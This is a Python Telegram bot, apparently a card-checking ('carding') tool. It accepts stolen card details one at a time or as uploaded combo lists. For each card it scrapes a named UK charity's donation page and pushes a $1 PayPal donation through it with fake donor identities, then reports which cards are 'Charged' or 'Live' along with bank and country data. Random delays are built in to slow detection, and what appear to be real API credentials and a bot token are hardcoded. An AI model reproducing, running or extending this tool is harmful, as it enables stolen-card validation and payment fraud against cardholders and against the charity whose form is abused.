#!/usr/bin/env python3
"""
PayPal $1 Rain Checker - Railway Deploy
Owner: @TomanSamurai (7926510116)
"""

import asyncio
import re
import base64
import time
import random
import os
from typing import Dict
from dataclasses import dataclass

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

import aiohttp
from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton

API_ID = int(os.environ.get("31029204", "0"))
API_HASH = os.environ.get("31b78b3099eb9d31b30eeba6d58d8e26", "")
BOT_TOKEN = os.environ.get("8568309620:AAFR8RVCtmCksaQyWxHjqFVyR6_LsLeBfPM", "")
OWNER_ID = 7926510116

active_scans: Dict[int, dict] = {}
app = Client("paypal_rain_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


@dataclass
class BinInfo:
    info: str
    bank: str
    country: str


async def get_bin_info(session: aiohttp.ClientSession, cc_num: str) -> BinInfo:
    bin_num = cc_num[:6]
    try:
        async with session.get(f"https://lookup.binlist.net/{bin_num}", timeout=aiohttp.ClientTimeout(total=8)) as resp:
            if resp.status == 200:
                data = await resp.json()
                scheme = data.get('scheme', 'UNKNOWN').upper()
                type_ = data.get('type', 'UNKNOWN').upper()
                brand = data.get('brand', 'UNKNOWN').upper()
                bank = data.get('bank', {}).get('name', 'UNKNOWN').upper()
                country = data.get('country', {}).get('name', 'UNKNOWN').upper()
                emoji = data.get('country', {}).get('emoji', '🏳️')
                currency = data.get('country', {}).get('currency', 'UNK')
                return BinInfo(
                    info=f"{scheme} - {type_} - {brand}",
                    bank=bank,
                    country=f"{country} {emoji} - [{currency}]"
                )
    except Exception:
        pass
    return BinInfo(info="UNKNOWN", bank="UNKNOWN", country="UNKNOWN")


def generate_fake_data() -> dict:
    first = random.choice(["James", "Emma", "Michael", "Sophia", "William"])
    last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first.lower()}{random.randint(100, 9999)}@gmail.com"
    return {"first_name": first, "last_name": last, "email": email}


async def check_card(session: aiohttp.ClientSession, cc_line: str) -> str:
    try:
        parts = [x.strip() for x in cc_line.split("|")]
        if len(parts) != 4:
            return "INVALID"
        number, month, year, cvc = parts
        month = month.zfill(2)
        year = year[2:] if len(year) == 4 else year
    except Exception:
        return "INVALID"

    fake = generate_fake_data()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

    try:
        async with session.get("https://stockportmecfs.co.uk/donate-now/", headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            text = await resp.text()
            
            form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', text)
            form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', text)
            form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', text)
            enc_token = re.search(r'"data-client-token":"(.*?)"', text)
            
            if not all([form_hash, form_prefix, form_id, enc_token]):
                return "ERROR"
            
            form_hash = form_hash.group(1)
            form_prefix = form_prefix.group(1)
            form_id = form_id.group(1)
            enc_token = enc_token.group(1)
            
            access_token_match = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token).decode('utf-8'))
            if not access_token_match:
                return "ERROR"
            access_token = access_token_match.group(1)

        payload_create = {
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-hash': form_hash,
            'give-amount': "1.00",
            'payment-mode': 'paypal-commerce',
            'give_first': fake["first_name"],
            'give_last': fake["last_name"],
            'give_email': fake["email"],
            'give-gateway': 'paypal-commerce'
        }
        
        async with session.post(
            "https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order",
            data=payload_create,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as resp:
            result = await resp.json()
            order_id = result['data']['id']

        payload_confirm = {
            "payment_source": {
                "card": {
                    "number": number,
                    "expiry": f"20{year}-{month}",
                    "security_code": cvc
                }
            }
        }
        
        async with session.post(
            f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            json=payload_confirm,
            headers={
                'Authorization': f"Bearer {access_token}",
                'Content-Type': 'application/json'
            },
            timeout=aiohttp.ClientTimeout(total=15)
        ) as resp:
            await resp.text()

        async with session.post(
            f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}",
            data=payload_create,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as resp:
            res_text = (await resp.text()).lower()
            
            if any(x in res_text for x in ['thank', 'thanks', 'true']):
                return "CHARGED"
            if 'insufficient_funds' in res_text:
                return "INSUFFICIENT_FUNDS"
            return "DECLINED"
            
    except asyncio.TimeoutError:
        return "TIMEOUT"
    except Exception:
        return "ERROR"


async def process_single_card(message: Message, cc_line: str):
    chat_id = message.chat.id
    
    initial_msg = await message.reply_text(
        "<b>Gateway :</b> #PayPal_Custom ($1.00)\n<b>By :</b> @TomanSamurai",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"💳 {cc_line}", callback_data="card")],
            [InlineKeyboardButton("📊 Status: CHECKING...", callback_data="status")]
        ])
    )
    
    start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        result = await check_card(session, cc_line)
        elapsed = time.time() - start_time
        
        status_map = {
            "CHARGED": ("Charge", "🔥"),
            "INSUFFICIENT_FUNDS": ("Live", "✅"),
            "DECLINED": ("DECLINED", "❌"),
            "TIMEOUT": ("TIMEOUT", "⏱️"),
            "ERROR": ("ERROR", "⚠️"),
            "INVALID": ("INVALID", "❌")
        }
        status_text, status_emoji = status_map.get(result, ("UNKNOWN", "⚠️"))
        
        await initial_msg.edit_text(
            "<b>Gateway :</b> #PayPal_Custom ($1.00)\n<b>By :</b> @TomanSamurai",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"💳 {cc_line}", callback_data="card")],
                [InlineKeyboardButton(f"📊 Status: {status_text} {status_emoji}", callback_data="status")]
            ])
        )
        
        if result in ["CHARGED", "INSUFFICIENT_FUNDS"]:
            bin_data = await get_bin_info(session, cc_line.split('|')[0])
            status_full = "<b>Charged - $1 (Refund)!</b>" if result == "CHARGED" else "<b>Approved - INSUFFICIENT_FUNDS!</b>"
            resp_emoji = "<b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥</b>" if result == "CHARGED" else "<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</b>"
            
            msg = (
                f"<b>#PayPal_Charge ($1) [single] 🌟</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{cc_line}</code>\n"
                f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {resp_emoji}\n"
                f"<b>[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status_full}\n"
                f"<b>[ϟ] 𝐓𝐚𝐤𝐞𝐧:</b> <b>{elapsed:.2f} 𝐒.</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ϟ] 𝐈𝐧𝐟𝐨:</b> <b>{bin_data.info}</b>\n"
                f"<b>[ϟ] 𝐁𝐚𝐧𝐤:</b> <b>{bin_data.bank}</b>\n"
                f"<b>[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{bin_data.country}</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌥] 𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f} 𝐒𝐞𝐜.</b>\n"
                f"<b>[⎇] 𝐑𝐞𝐪 𝐁𝐲:</b> <b>VIP</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[⌤] 𝐃𝐞𝐯 𝐛𝐲:</b> <b>@TomanSamurai</b>"
            )
            await message.reply_text(msg)


async def process_mass_check(message: Message, lines: list):
    chat_id = message.chat.id
    
    if chat_id in active_scans:
        await message.reply_text("<b>⚠️ A scan is already running. Please stop it first.</b>")
        return
    
    gateway_name = "#PayPal_Custom ($1.00)"
    
    initial_msg = await message.reply_text(
        f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> @TomanSamurai",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"💳 {lines[0]}", callback_data="card")],
            [InlineKeyboardButton("📊 Status: STARTING...", callback_data="status")],
            [
                InlineKeyboardButton("💰 Charged ➜ [ 0 ]", callback_data="charged"),
                InlineKeyboardButton("✅ Approved ➜ [ 0 ]", callback_data="approved")
            ],
            [
                InlineKeyboardButton("❌ Declined ➜ [ 0 ]", callback_data="declined"),
                InlineKeyboardButton(f"📂 Cards ➜ [ 0/{len(lines)} ]", callback_data="cards")
            ],
            [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{chat_id}")]
        ])
    )
    
    active_scans[chat_id] = {
        "stop": False,
        "stats": {"charged": 0, "approved": 0, "declined": 0, "total": len(lines), "current": 0},
        "message_id": initial_msg.id
    }
    
    async with aiohttp.ClientSession() as session:
        for idx, line in enumerate(lines):
            if active_scans.get(chat_id, {}).get("stop"):
                await initial_msg.edit_text(
                    f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> @TomanSamurai",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Scan Stopped", callback_data="stopped")]])
                )
                break
            
            start_time = time.time()
            result = await check_card(session, line)
            elapsed = time.time() - start_time
            
            stats = active_scans[chat_id]["stats"]
            stats["current"] = idx + 1
            
            if result == "CHARGED":
                stats["charged"] += 1
            elif result == "INSUFFICIENT_FUNDS":
                stats["approved"] += 1
            else:
                stats["declined"] += 1
            
            status_map = {
                "CHARGED": "CHARGED",
                "INSUFFICIENT_FUNDS": "APPROVED",
                "DECLINED": "DECLINED",
                "TIMEOUT": "TIMEOUT",
                "ERROR": "ERROR"
            }
            status_text = status_map.get(result, "UNKNOWN")
            
            try:
                await initial_msg.edit_text(
                    f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> @TomanSamurai",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(f"💳 {line}", callback_data="card")],
                        [InlineKeyboardButton(f"📊 Status: {status_text}", callback_data="status")],
                        [
                            InlineKeyboardButton(f"💰 Charged ➜ [ {stats['charged']} ]", callback_data="charged"),
                            InlineKeyboardButton(f"✅ Approved ➜ [ {stats['approved']} ]", callback_data="approved")
                        ],
                        [
                            InlineKeyboardButton(f"❌ Declined ➜ [ {stats['declined']} ]", callback_data="declined"),
                            InlineKeyboardButton(f"📂 Cards ➜ [ {stats['current']}/{stats['total']} ]", callback_data="cards")
                        ],
                        [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{chat_id}")]
                    ])
                )
            except Exception:
                pass
            
            if result in ["CHARGED", "INSUFFICIENT_FUNDS"]:
                bin_data = await get_bin_info(session, line.split('|')[0])
                status_full = "<b>Charged - $1 (Refund)!</b>" if result == "CHARGED" else "<b>Approved - INSUFFICIENT_FUNDS!</b>"
                resp_emoji = "<b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥</b>" if result == "CHARGED" else "<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</b>"
                
                msg = (
                    f"<b>#PayPal_Charge ($1) [mass] 🌟</b>\n"
                    f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                    f"<b>[ϟ] 𝐂𝐚𝐫𝐝:</b> <code>{line}</code>\n"
                    f"<b>[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {resp_emoji}\n"
                    f"<b>[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status_full}\n"
                    f"<b>[ϟ] 𝐓𝐚𝐤𝐞𝐧:</b> <b>{elapsed:.2f} 𝐒.</b>\n"
                    f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                    f"<b>[ϟ] 𝐈𝐧𝐟𝐨:</b> <b>{bin_data.info}</b>\n"
                    f"<b>[ϟ] 𝐁𝐚𝐧𝐤:</b> <b>{bin_data.bank}</b>\n"
                    f"<b>[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <b>{bin_data.country}</b>\n"
                    f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                    f"<b>[⌥] 𝐓𝐢𝐦𝐞:</b> <b>{elapsed:.2f} 𝐒𝐞𝐜.</b>\n"
                    f"<b>[⎇] 𝐑𝐞𝐪 𝐁𝐲:</b> <b>VIP</b>\n"
                    f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                    f"<b>[⌤] 𝐃𝐞𝐯 𝐛𝐲:</b> <b>@TomanSamurai</b>"
                )
                await message.reply_text(msg)
            
            await asyncio.sleep(random.uniform(10, 13))
    
    final_msg = (
        f"<b>🏁 Scan Finished!</b>\n\n"
        f"<b>💰 Total Charged:</b> <b>{stats['charged']}</b>\n"
        f"<b>✅ Total Approved:</b> <b>{stats['approved']}</b>\n"
        f"<b>❌ Total Declined:</b> <b>{stats['declined']}</b>"
    )
    await message.reply_text(final_msg)
    
    if chat_id in active_scans:
        del active_scans[chat_id]


@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    user = message.from_user
    user_name = user.first_name
    username = user.username or "N/A"
    user_id = user.id
    
    welcome_msg = (
        f"<b>[ϟ] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟</b>\n"
        f"<b>[ϟ] 𝐍𝐚𝐦𝐞:</b> <b>{user_name}</b>\n"
        f"<b>[ϟ] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:</b> <b>@{username}</b>\n"
        f"<b>[ϟ] 𝐈𝐃:</b> <b>{user_id}</b>\n\n"
        f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
        f"<b>[ϟ] 𝐁𝐨𝐭 𝐎𝐰𝐧𝐞𝐫:</b> <b>@TomanSamurai</b>\n"
        f"<b>[ϟ] 𝐃𝐞𝐯 𝐁𝐲:</b> <b>@TomanSamurai</b>"
    )
    
    await message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Gateways", callback_data="show_gateways")]])
    )


@app.on_message(filters.command("pp"))
async def pp_command(client: Client, message: Message):
    if len(message.command) < 2:
        await message.reply_text(
            "<b>❌ Usage:</b> <code>/pp card|month|year|cvv</code>\n"
            "<b>Example:</b> <code>/pp 4532015112830366|12|2025|123</code>"
        )
        return
    
    cc_line = message.text.split(maxsplit=1)[1].strip()
    
    if "|" not in cc_line or len(cc_line.split("|")) != 4:
        await message.reply_text("<b>❌ Invalid format. Use:</b> <code>card|month|year|cvv</code>")
        return
    
    await process_single_card(message, cc_line)


@app.on_message(filters.document)
async def handle_document(client: Client, message: Message):
    doc = message.document
    
    if not doc.file_name.endswith(".txt"):
        await message.reply_text("<b>❌ Please send a <code>.txt</code> file.</b>")
        return
    
    file_path = await message.download()
    
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if "|" in l and len(l.strip().split("|")) == 4]
    
    os.remove(file_path)
    
    if not lines:
        await message.reply_text("<b>❌ Invalid file format. Make sure it's a combo list.</b>")
        return
    
    await process_mass_check(message, lines)


@app.on_callback_query(filters.regex(r"^stop_"))
async def stop_scan(client: Client, callback_query: CallbackQuery):
    chat_id = callback_query.message.chat.id
    
    if chat_id in active_scans:
        active_scans[chat_id]["stop"] = True
        await callback_query.answer("🛑 Stopping scan...", show_alert=False)
    else:
        await callback_query.answer("❌ No active scan", show_alert=False)


@app.on_callback_query(filters.regex("show_gateways"))
async def show_gateways(client: Client, callback_query: CallbackQuery):
    gateways_msg = (
        f"<b>[ϟ] 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 🔥</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>[ϟ] 𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐕𝐕 𝐂𝐮𝐬𝐭𝐨𝐦 [1$] - /pp</b>"
    )
    await callback_query.message.reply_text(gateways_msg)
    await callback_query.answer("💎 Gateways", show_alert=False)


@app.on_callback_query()
async def handle_callback(client: Client, callback_query: CallbackQuery):
    await callback_query.answer()


if __name__ == "__main__":
    print("🚀 PayPal Rain Bot Starting...")
    print(f"👤 Owner: @TomanSamurai (7926510116)")
    print(f"⚡ Using uvloop: {asyncio.get_event_loop_policy().__class__.__name__}")
    app.run()
